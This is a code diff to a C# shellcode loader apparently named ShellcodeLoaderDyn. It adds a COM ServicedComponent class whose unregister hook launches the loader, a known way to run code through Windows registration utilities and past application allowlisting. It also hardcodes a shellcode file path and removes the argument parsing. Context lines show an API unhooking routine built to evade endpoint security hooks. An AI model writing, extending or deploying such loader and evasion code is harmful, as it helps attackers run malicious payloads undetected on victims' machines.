@@ -6,8 +6,21 @@ using System.Linq;
 using System.Runtime.InteropServices;
 using System.Text;
 using DI = XYZ.DI;
+using System.EnterpriseServices;
+
 namespace ShellcodeLoaderDyn
 {
+    public class Bypass : ServicedComponent
+    {
+        public Bypass() { Console.WriteLine("I am a basic COM Object"); }
+
+        [ComUnregisterFunction] //This executes if registration fails
+        public static void UnRegisterClass(string key)
+        {
+            Console.WriteLine("DLL Started, calling Main");
+            Program.Main();
+        }
+    }
     public class Delegates
     {
         [UnmanagedFunctionPointer(CallingConvention.StdCall)]
@@ -18,7 +31,7 @@ namespace ShellcodeLoaderDyn
     partial class Unhooker
     {
         static string[] functions =
-                    {
+        {
             "NtAcceptConnectPort",
             "NtAccessCheck",
             "NtAccessCheckAndAuditAlarm",
@@ -1193,66 +1206,12 @@ namespace ShellcodeLoaderDyn
             return keybuilder.ToString();
         }
 
-        public static void usage()
-        {
-            StringBuilder sb = new StringBuilder();
-            sb.AppendLine("Usage: ShellcodeLoader.exe [-u] [-p password] [shellcode_file]");
-            sb.AppendLine("\tshellcode_file\tfile containing the shellcode");
-            sb.AppendLine("If <shellcode> is not specified, the program will search for \"shellcode.bin\" the current working directory.");
-            sb.AppendLine("\t-p password\tif a password is required for the key, it will be read from this parameter instead of asking interactively");
-            sb.AppendLine("\t-u\tDON'T UNHOOK API before loading the shellcode");
-            Console.WriteLine(sb.ToString());
-        }
-        static int Main(string[] args)
+        public static int Main()
         {
             // PARAMS
-            string filename = null;
+            string filename = "C:\\Temp\\shellcode.bin";
             bool unhook = true;
             string password = null;
-
-            for (int i = 0; i < args.Length; i++)
-            {
-                switch (args[i])
-                {
-                    case "-u":
-                        unhook = false;
-                        break;
-                    case "-p":
-                        if (i + 1 >= args.Length)
-                        {
-                            usage();
-                            return -1;
-                        }
-                        password = args[i + 1];
-                        i++;
-                        break;
-                    default:
-                        if (filename == null)
-                        {
-                            filename = args[i];
-                        }
-                        else
-                        {
-                            usage();
-                            return -1;
-                        }
-                        break;
-                }
-            }
-
-            if (filename == null)
-            {
-                if (File.Exists("shellcode.bin"))
-                {
-                    filename = "shellcode.bin";
-                }
-                else
-                {
-                    Console.Error.WriteLine("Please specify an input filename");
-                    usage();
-                    return 0;
-                }
-            }
 
             if (!File.Exists(filename))
             {
